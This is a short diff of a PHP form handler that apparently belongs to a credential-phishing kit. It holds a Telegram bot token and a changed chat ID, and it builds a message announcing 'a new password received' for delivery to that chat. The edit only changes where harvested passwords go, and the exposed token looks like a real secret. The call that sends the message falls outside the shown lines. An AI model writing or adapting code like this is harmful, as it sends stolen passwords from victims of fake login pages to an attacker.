@@ -77,7 +77,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Infos Telegram
     $botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
-    $chatID = "-4639401211";
+    $chatID = "-1002514605037";
 
     // Message bien formaté
     $message  = "<b>🔐 Nouveau mot de passe reçu :</b>\n\n";
